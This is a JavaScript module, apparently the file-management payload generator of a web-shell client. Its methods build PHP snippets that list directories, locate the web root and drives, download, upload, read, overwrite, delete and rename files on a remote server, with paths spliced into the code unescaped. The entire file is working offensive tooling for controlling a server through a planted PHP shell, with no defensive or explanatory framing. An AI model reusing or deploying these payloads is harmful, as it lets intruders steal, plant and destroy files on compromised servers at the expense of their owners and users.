export default class File {
    constructor(arg1, arg2) {
        this.arg1 = arg1
        this.arg2 = arg2
        // console.log(1);
    }


    dir(){
        //todo 5.2不能跨目录
        return `
        $dir = '${arguments[1]}';
        if (!@is_dir($dir)) {
            echo 'ERROR:// Path Not Found Or No Permission!';
        } else {
            $res = '';
            foreach (scandir($dir) as $value) {
                if ($value === '.' || $value === '..') {
                    continue;
                }
                $file = $dir .'/'. $value;
                $res .= $value . '\`\`';
                $res .= (is_dir($file) ? '1' : '0') . '\`\`';
                $res .= date("Y/m/d H:i", filemtime($file)) . '\`\`';
                $res .= @filesize($file);
                $res .= '\n';
            }
            ${arguments[0]}
            encode($res);
        }`
    }

    pwd() {
        return `
        $path = dirname($_SERVER['SCRIPT_FILENAME']);
        if (empty($path)){ $path = dirname($_SERVER['PATH_TRANSLATED']);}
        if (empty($path)){ $path = getcwd();}
        $root_path = '';
        if (substr($path, 0, 1) != '/') {
            foreach (range('C', 'Z') as $L) {
                if (is_dir($L . ':')) {$root_path .= $L . ':|';}
            }
        } else {
            $root_path .= '/';
        }
        ${arguments[0]}; 
        encode($root_path . '\`\`' . $path);
        `
    }

    download() {
        return `
        $file = '${this.arg1}';
        header('Content-Type: application/octet-stream');
        header('Content-Disposition:attachment;filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires:0');
        header('Content-Length:' . filesize($file));

        set_time_limit(0);
        $file = @fopen($file, 'rb');
        while (!feof($file)) {
            print(@fread($file, 1024 * 8));
            ob_flush();
            flush();
        }
       `
    }

    upload() {
        return `
         try {
            if ($_FILES['${this.arg1}']['error']) echo 'ERROR://upload fail';
            else move_uploaded_file($_FILES['${this.arg1}']['tmp_name'], '${this.arg2}'.$_FILES['${this.arg1}']['name']);
        } catch (Exception $e) {
            echo 'ERROR://No Permission';
        }
       `
    }

    createFile() {
        return `
       @file_put_contents('${arguments[1]}', '');
       `
    }

    createFolder() {
        return `
       @mkdir('${arguments[1]}');
       `
    }

    read() {
        return `
        $res = @file_get_contents('${arguments[1]}'); ${arguments[0]} encode($res);
        `
    }

    change() {
        return `@file_put_contents('${arguments[1]}', base64_decode('${arguments[2]}'));`
    }

    deleteFile() {
        return `
       @unlink('${arguments[1]}');
       `
    }

    deleteFolder() {
        return `
       @rmdir('${arguments[1]}');
       `
    }

    rename() {
        return `
       @rename('${arguments[1]}','${arguments[2]}');
       `
    }
}

